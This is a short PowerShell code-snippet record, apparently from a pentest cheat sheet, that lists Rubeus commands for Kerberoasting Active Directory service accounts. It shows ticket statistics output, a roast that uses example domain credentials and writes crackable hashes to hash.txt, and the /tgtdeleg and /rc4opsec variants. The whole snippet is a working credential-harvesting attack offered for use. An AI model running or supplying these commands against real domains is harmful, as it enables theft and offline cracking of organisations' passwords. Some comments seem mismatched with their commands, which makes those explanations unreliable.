---
id: 296dee85-7545-4c2a-9d80-970e6d4e868b
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:04.929431+00:00'
updated_at: '2023-04-10T20:26:35.052553+00:00'
---

# Code Snippet 296dee85

**Language**: Powershell

```powershell
# Stats
Rubeus.exe kerberoast /stats
-------------------------------------   ----------------------------------
| Supported Encryption Type | Count |  | Password Last Set Year | Count |
-------------------------------------  ----------------------------------
| RC4_HMAC_DEFAULT          | 1     |  | 2021                   | 1     |
-------------------------------------  ----------------------------------

# Kerberoast (RC4 ticket)
Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt

# Kerberoast (AES ticket)
# Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.
Rubeus.exe kerberoast /tgtdeleg

# Kerberoast (RC4 ticket)
# The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.
Rubeus.exe kerberoast /rc4opsec
```
